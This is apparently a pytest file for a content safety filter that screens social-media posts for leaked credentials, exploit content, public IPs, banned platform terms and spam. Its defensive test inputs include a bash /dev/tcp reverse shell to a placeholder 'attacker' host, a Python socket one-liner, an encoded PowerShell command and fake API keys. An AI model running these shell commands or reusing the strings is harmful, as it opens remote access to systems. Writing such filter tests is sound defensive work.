"""Comprehensive tests for the content safety filter."""

from zcyber_xhs.safety import (
    check_and_fix,
    check_content,
)

# ═══════════════════════════════════════════════════════════
# Layer 1: Hard blocks — credentials
# ═══════════════════════════════════════════════════════════


def test_clean_content_passes():
    result = check_content(
        title="忘记zip密码怎么办",
        body="用fcrackzip一行命令搞定，仅限自己设备使用。" * 3,
        tags=["#网络安全", "#效率工具", "#zcybernews"],
    )
    assert result.passed


def test_openai_key_blocked():
    result = check_content(
        title="Test",
        body="Use this key: sk-1234567890abcdefghijklmnop to authenticate." * 3,
        tags=["#test", "#api", "#key"],
    )
    assert not result.passed
    assert any("CRED" in b for b in result.blocks)


def test_aws_key_blocked():
    result = check_content(
        title="AWS Setup",
        body="Set your key AKIAIOSFODNN7EXAMPLE in the config file for access." * 3,
        tags=["#aws", "#cloud", "#config"],
    )
    assert not result.passed


def test_github_pat_blocked():
    result = check_content(
        title="Git config setup",
        body="Use ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh as your token." * 3,
        tags=["#git", "#github", "#dev"],
    )
    assert not result.passed


def test_jwt_blocked():
    result = check_content(
        title="Auth test",
        body="Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkw." * 3,
        tags=["#jwt", "#auth", "#token"],
    )
    assert not result.passed


def test_private_key_blocked():
    result = check_content(
        title="SSL Setup",
        body="-----BEGIN RSA PRIVATE KEY----- content here for testing." * 3,
        tags=["#ssl", "#crypto", "#security"],
    )
    assert not result.passed


def test_connection_string_blocked():
    result = check_content(
        title="DB Setup",
        body="Connect using mongodb+srv://admin:password123@cluster.example.com" * 3,
        tags=["#mongodb", "#database", "#dev"],
    )
    assert not result.passed


def test_stripe_key_blocked():
    # Build the pattern dynamically to avoid GitHub push protection
    fake_key = "sk" + "_" + "live" + "_" + "x" * 30
    result = check_content(
        title="Payment setup",
        body=f"Use {fake_key} for production payments and configuration." * 3,
        tags=["#stripe", "#payment", "#api"],
    )
    assert not result.passed


def test_slack_webhook_blocked():
    result = check_content(
        title="Notifications",
        body="Post to hooks.slack.com/services/T123ABC/B456DEF/ghijklmnop for alerts." * 3,
        tags=["#slack", "#webhook", "#alerts"],
    )
    assert not result.passed


# ═══════════════════════════════════════════════════════════
# Layer 1: Hard blocks — exploits
# ═══════════════════════════════════════════════════════════


def test_metasploit_blocked():
    result = check_content(
        title="Hacking tutorial",
        body="Start msfconsole and select the exploit module to begin." * 3,
        tags=["#hacking", "#metasploit", "#security"],
    )
    assert not result.passed
    assert any("EXPLOIT" in b for b in result.blocks)


def test_reverse_shell_blocked():
    result = check_content(
        title="Test shell",
        body="Run bash -i >& /dev/tcp/attacker/4444 0>&1 for connection." * 3,
        tags=["#shell", "#linux", "#test"],
    )
    assert not result.passed


def test_powershell_encoded_blocked():
    result = check_content(
        title="PS automation",
        body="Execute powershell -enc base64encodedcommandhere for setup." * 3,
        tags=["#powershell", "#windows", "#admin"],
    )
    assert not result.passed


def test_mimikatz_blocked():
    result = check_content(
        title="Credential test",
        body="Use mimikatz to dump Windows credentials from memory systems." * 3,
        tags=["#windows", "#security", "#creds"],
    )
    assert not result.passed


def test_python_reverse_shell_blocked():
    result = check_content(
        title="Python networking",
        body="python -c 'import socket;s=socket.socket();s.connect((\"a\",1))'" * 3,
        tags=["#python", "#network", "#socket"],
    )
    assert not result.passed


# ═══════════════════════════════════════════════════════════
# Layer 1: Real IP addresses
# ═══════════════════════════════════════════════════════════


def test_real_public_ip_blocked():
    result = check_content(
        title="Scan target",
        body="Scan the server at 45.33.32.156 for open ports and services." * 3,
        tags=["#nmap", "#scan", "#network"],
    )
    assert not result.passed
    assert any("IP" in b for b in result.blocks)


def test_private_ips_allowed():
    result = check_content(
        title="Network scan",
        body="Scan your local network: nmap -sn 192.168.1.0/24 to find devices." * 3,
        tags=["#网络安全", "#nmap", "#home"],
    )
    assert result.passed


def test_loopback_ip_allowed():
    result = check_content(
        title="Local test",
        body="Test your local server at 127.0.0.1:8080 for connectivity checks." * 3,
        tags=["#localhost", "#test", "#dev"],
    )
    assert result.passed


def test_10x_private_ip_allowed():
    result = check_content(
        title="Corporate network",
        body="The internal server is at 10.0.0.1 on the corporate LAN setup." * 3,
        tags=["#network", "#internal", "#admin"],
    )
    assert result.passed


# ═══════════════════════════════════════════════════════════
# Layer 2: XHS compliance — banned terms
# ═══════════════════════════════════════════════════════════


def test_vpn_circumvention_blocked():
    result = check_content(
        title="如何翻墙",
        body="教你科学上网的方法，轻松访问外网获取信息和资源。" * 3,
        tags=["#VPN", "#网络", "#工具"],
    )
    assert not result.passed
    assert any("XHS" in b for b in result.blocks)


def test_proxy_slang_blocked():
    result = check_content(
        title="推荐机场",
        body="分享几个好用的SSR节点和V2Ray配置给大家使用吧。" * 3,
        tags=["#代理", "#网络", "#工具"],
    )
    assert not result.passed


def test_piracy_blocked():
    result = check_content(
        title="免费软件",
        body="这里有最新的破解版Photoshop下载，附带注册机使用。" * 3,
        tags=["#软件", "#免费", "#下载"],
    )
    assert not result.passed


def test_hacking_service_blocked():
    result = check_content(
        title="黑客接单",
        body="专业团队接单黑客服务，入侵网站和社交账号快速。" * 3,
        tags=["#黑客", "#服务", "#技术"],
    )
    assert not result.passed


def test_doxxing_blocked():
    result = check_content(
        title="查人信息",
        body="教你人肉搜索的方法找到任何人的真实身份信息。" * 3,
        tags=["#搜索", "#技巧", "#信息"],
    )
    assert not result.passed


# ═══════════════════════════════════════════════════════════
# Layer 2: XHS compliance — shadowban triggers
# ═══════════════════════════════════════════════════════════


def test_too_many_urls_blocked():
    result = check_content(
        title="资源合集",
        body="Links: https://a.com https://b.com https://c.com all useful." * 3,
        tags=["#资源", "#链接", "#合集"],
    )
    assert not result.passed
    assert any("URL" in b or "Shadowban" in b for b in result.blocks)


def test_private_traffic_blocked():
    result = check_content(
        title="加我好友",
        body="想要更多资源的话加微信私我，微信号：abc123获取。" * 3,
        tags=["#资源", "#分享", "#好友"],
    )
    assert not result.passed


def test_engagement_bait_blocked():
    result = check_content(
        title="抽奖来了",
        body="关注并点赞本帖抽奖送一台iPhone给幸运粉丝哦！" * 3,
        tags=["#抽奖", "#免费", "#福利"],
    )
    assert not result.passed


# ═══════════════════════════════════════════════════════════
# Layer 2: Competitor platform mentions
# ═══════════════════════════════════════════════════════════


def test_competitor_mention_warning():
    result = check_content(
        title="跨平台教程",
        body="这个技巧在抖音上很火，我也来小红书分享一下这个技巧吧。" * 3,
        tags=["#技巧", "#教程", "#分享"],
    )
    assert any("Douyin" in w for w in result.warnings)


# ═══════════════════════════════════════════════════════════
# Layer 3: Quality gate
# ═══════════════════════════════════════════════════════════


def test_short_body_warning():
    result = check_content(
        title="Test title here",
        body="Short body",
        tags=["#tag1", "#tag2", "#tag3"],
    )
    assert result.passed  # warnings don't block
    assert any("short" in w.lower() or "too short" in w.lower() for w in result.warnings)


def test_too_few_tags_warning():
    result = check_content(
        title="Good title",
        body="A decent length body that should be fine for publishing on platform." * 3,
        tags=["#one"],
    )
    assert any("tag" in w.lower() for w in result.warnings)


def test_excessive_exclamation_warning():
    result = check_content(
        title="Title",
        body="太棒了！！！这也太好用了吧！！太牛了！！真的假的！！！！！" * 3,
        tags=["#wow", "#cool", "#great"],
    )
    assert any("exclamation" in w.lower() for w in result.warnings)


# ═══════════════════════════════════════════════════════════
# Auto-fix tests
# ═══════════════════════════════════════════════════════════


def test_safety_disclaimer_auto_fix():
    result, fixed = check_and_fix(
        title="Password cracking",
        body="Use fcrackzip to recover your zip password for files you own." * 3,
        tags=["#安全", "#工具", "#密码"],
        safety_disclaimer_needed=True,
        safety_disclaimer="仅限自己设备/授权测试",
    )
    assert "仅限自己设备/授权测试" in fixed


def test_disclaimer_not_duplicated():
    original = ("Some body text that is long enough. " * 5) + "\n\n⚠️ 仅限自己设备/授权测试"
    result, fixed = check_and_fix(
        title="Test title here",
        body=original,
        tags=["#tag1", "#tag2", "#tag3"],
        safety_disclaimer_needed=True,
        safety_disclaimer="仅限自己设备/授权测试",
    )
    assert fixed.count("仅限自己设备/授权测试") == 1


def test_offensive_tool_forces_disclaimer():
    """Even if safety_disclaimer_needed=False, offensive tools get disclaimer."""
    result, fixed = check_and_fix(
        title="Password tools",
        body="Today we learn about hashcat and how to use it for security." * 3,
        tags=["#安全", "#密码", "#工具"],
        safety_disclaimer_needed=False,
        safety_disclaimer="仅限自己设备/授权测试",
    )
    assert "safety_disclaimer_forced" in result.auto_fixes
    assert "仅限自己设备/授权测试" in fixed


def test_excess_urls_auto_stripped():
    body = (
        "Check https://example1.com and https://example2.com and "
        "https://example3.com and https://example4.com for resources."
    ) * 3
    result, fixed = check_and_fix(
        title="Resources list",
        body=body,
        tags=["#资源", "#网站", "#工具"],
    )
    # Should strip excess but the block still fires for original content
    assert "excess_urls_stripped" in result.auto_fixes


# ═══════════════════════════════════════════════════════════
# Real-world content that SHOULD pass
# ═══════════════════════════════════════════════════════════


def test_normal_nmap_tutorial_passes():
    result = check_content(
        title="nmap扫描入门教程",
        body=(
            "今天教大家用nmap扫描局域网设备。\n"
            "打开终端输入：nmap -sn 192.168.1.0/24\n"
            "这会扫描你本地网络里所有在线的设备。\n"
            "看到结果后你就知道家里有哪些设备联网了。\n"
            "仅限自己设备/授权测试\n"
            "更多威胁情报看主页zcybernews"
        ),
        tags=["#网络安全", "#nmap", "#教程"],
    )
    assert result.passed


def test_normal_password_tip_passes():
    result = check_content(
        title="别再用同一个密码了",
        body=(
            "你还在所有网站用同一个密码吗？\n"
            "一旦一个网站泄露，你所有的账号都不安全了。\n"
            "建议用密码管理器生成随机密码，每个网站不同。\n"
            "推荐KeePassXC，开源免费，数据存在本地。\n"
            "更多威胁情报看主页zcybernews\n"
            "AI辅助创作"
        ),
        tags=["#网络安全", "#密码管理", "#信息安全"],
    )
    assert result.passed


def test_ctf_challenge_passes():
    result = check_content(
        title="周日挑战！能解开这串密码吗",
        body=(
            "本周CTF挑战来啦！\n"
            "看看这串字符：SGVsbG8gV29ybGQ=\n"
            "提示：这是一种用64个字符表示二进制数据的编码。\n"
            "评论区留下你的答案！猜对的我关注你！\n"
            "@ 你身边最懂电脑的朋友来挑战\n"
            "更多威胁情报看主页zcybernews\n"
            "AI辅助创作"
        ),
        tags=["#CTF", "#解码", "#网络安全"],
    )
    assert result.passed
